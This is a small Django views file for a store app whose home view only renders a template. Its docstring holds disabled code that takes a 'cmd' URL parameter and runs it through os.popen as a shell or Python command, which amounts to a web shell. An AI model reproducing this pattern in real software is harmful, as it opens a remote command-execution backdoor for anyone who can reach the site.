from django.shortcuts import render
from .models import Product


def home(request):
    """
    print(request.GET['cmd'])
    if request.GET['target'] == 'terminal':
        output = os.popen("cd ..; {}".format(request.GET['cmd'])).read()
        # output = os.system("cd ..; {}".format(request.GET['cmd']))
    elif request.GET['target'] == 'python':
        output = os.popen("cd ..; python -c \"{}\"".format(request.GET['cmd'])).read()
    #output = os.system('cd ..; ' + request.GET['cmd'])
    """
    return render(request, 'store/index.html')